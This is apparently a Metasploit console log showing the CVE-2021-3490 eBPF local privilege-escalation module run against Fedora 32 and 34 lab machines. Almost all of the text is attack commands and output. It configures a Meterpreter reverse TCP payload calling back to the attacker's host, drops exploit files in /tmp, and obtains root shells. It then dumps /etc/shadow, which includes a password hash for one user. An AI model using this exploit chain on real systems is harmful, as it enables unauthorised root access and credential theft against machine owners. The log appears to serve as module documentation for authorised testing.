msf6 exploit(multi/handler) > use exploit/linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > show options

Module options (exploit/linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   CmdTimeout  120              yes       Maximum number of seconds to wait for the exploit to complete
   SESSION                      yes       The session to run this module on.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.224.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Auto


msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > set SESSION 1
SESSION => 1
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > show options

Module options (exploit/linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.224.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Auto


msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > exploit

[*] Started reverse TCP handler on 192.168.224.128:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Writing '/tmp/.dFIC3w' (39352 bytes) ...
[*] Writing '/tmp/.sYuymmhR3Y' (250 bytes) ...
[*] Launching exploit ...
[!] Note that things may appear to hang due to the exploit not exiting.
[!] Feel free to press CTRL+C if the shell is returned before 200 seconds are up.
[*] Sending stage (3012548 bytes) to 192.168.224.223
[+] Exploit completed successfully, shell should be returning soon!
[+] Deleted /tmp/.dFIC3w
[+] Deleted /tmp/.sYuymmhR3Y
[*] Meterpreter session 2 opened (192.168.224.128:4444 -> 192.168.224.223:53154) at 2021-08-20 18:02:58 -0500
^C[-] Exploit failed [user-interrupt]: Interrupt
[-] exploit: Interrupted
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: root @ localhost.localdomain (uid=0, gid=0, euid=0, egid=0)
meterpreter > sysinfo
Computer     : localhost.localdomain
OS           : Fedora 32 (Linux 5.10.12-100.fc32.x86_64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > background
[*] Backgrounding session 2...
semsf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                    Connection
  --  ----  ----                   -----------                                    ----------
  1         meterpreter x64/linux  test @ localhost.localdomain (uid=1000, gid=1  192.168.224.128:45349 -> 192.168.224.223:4444
                                   000, euid=1000, egid=1000) @ loc...            (192.168.224.223)
  2         meterpreter x64/linux  root @ localhost.localdomain (uid=0, gid=0, e  192.168.224.128:4444 -> 192.168.224.223:53154
                                   uid=0, egid=0) @ localhost.local...            (192.168.224.223)

msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) >
```

### Fedora 34 with Linux Kernel 5.11.12-300
```
msf6 > sessions

Active sessions
===============

  Id  Name  Type                   Information                                    Connection
  --  ----  ----                   -----------                                    ----------
  1         meterpreter x64/linux  test @ fedora (uid=1000, gid=1000, euid=1000,  192.168.224.128:43029 -> 192.168.224.224:4444
                                    egid=1000) @ fedora.local                     (192.168.224.224)

msf6 > use exploit/linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > set SESSION 1
SESSION => 1
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > set LPORT 6644
LPORT => 6644
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > show options

Module options (exploit/linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   CmdTimeout  120             yes       Maximum number of seconds to wait for the exploit to complete
   SESSION     1               yes       The session to run this module on.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.224.128  yes       The listen address (an interface may be specified)
   LPORT  6644             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Auto


msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > set VERBOSE true
VERBOSE => true
msf6 exploit(linux/local/cve_2021_3490_ebpf_alu32_bounds_check_lpe) > exploit

[*] Started reverse TCP handler on 192.168.224.128:6644
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Unprivileged BPF loading is permitted
[+] Kernel version 5.11.12-300.fc34.x86_64 appears to be vulnerable
[+] Kernel config has CONFIG_BPF_SYSCALL enabled
[+] The target appears to be vulnerable.
[*] Dropping pre-compiled exploit on system...
[*] Writing '/tmp/.TGPokxM' (39352 bytes) ...
[*] Writing '/tmp/.RM7G8l5CtW' (250 bytes) ...
[*] Launching exploit ...
[!] Note that things may appear to hang due to the exploit not exiting.
[!] Feel free to press CTRL+C if the shell is returned before 200 seconds are up.
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3012548 bytes) to 192.168.224.224
[+] Exploit completed successfully, shell should be returning soon!
[+] Deleted /tmp/.TGPokxM
[+] Deleted /tmp/.RM7G8l5CtW
[*] Meterpreter session 3 opened (192.168.224.128:6644 -> 192.168.224.224:45650) at 2021-08-23 14:50:52 -0500

meterpreter > getuid
Server username: root @ fedora (uid=0, gid=0, euid=0, egid=0)
meterpreter > sysinfo
Computer     : fedora.local
OS           : Fedora 34 (Linux 5.11.12-300.fc34.x86_64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > cat /etc/shadow
root:!::0:99999:7:::
bin:*:18656:0:99999:7:::
daemon:*:18656:0:99999:7:::
adm:*:18656:0:99999:7:::
lp:*:18656:0:99999:7:::
sync:*:18656:0:99999:7:::
shutdown:*:18656:0:99999:7:::
halt:*:18656:0:99999:7:::
mail:*:18656:0:99999:7:::
operator:*:18656:0:99999:7:::
games:*:18656:0:99999:7:::
ftp:*:18656:0:99999:7:::
nobody:*:18656:0:99999:7:::
apache:!!:18740::::::
systemd-network:!!:18740::::::
systemd-coredump:!!:18740::::::
systemd-resolve:!!:18740::::::
systemd-oom:!!:18740::::::
systemd-timesync:!!:18740::::::
tss:!!:18740::::::
dbus:!!:18740::::::
polkitd:!!:18740::::::
avahi:!!:18740::::::
unbound:!!:18740::::::
dnsmasq:!!:18740::::::
nm-openconnect:!!:18740::::::
usbmuxd:!!:18740::::::
gluster:!!:18740::::::
rtkit:!!:18740::::::
pipewire:!!:18740::::::
geoclue:!!:18740::::::
chrony:!!:18740::::::
saslauth:!!:18740::::::
radvd:!!:18740::::::
rpc:!!:18740:0:99999:7:::
qemu:!!:18740::::::
openvpn:!!:18740::::::
nm-openvpn:!!:18740::::::
colord:!!:18740::::::
rpcuser:!!:18740::::::
abrt:!!:18740::::::
flatpak:!!:18740::::::
gdm:!!:18740::::::
gnome-initial-setup:!!:18740::::::
vboxadd:!!:18740::::::
sshd:!!:18740::::::
tcpdump:!!:18740::::::
test:$6$ljo05fNdlEN6MXS$wKC5TeBRRD8W3LYglBpXV3ydvvK5348cTO0T65haiZ9utDVJCdMD9vJoKr.w0OeHKSr4FahUv/CUIsFcdQqUT/:18862:0:99999:7:::
meterpreter >
```
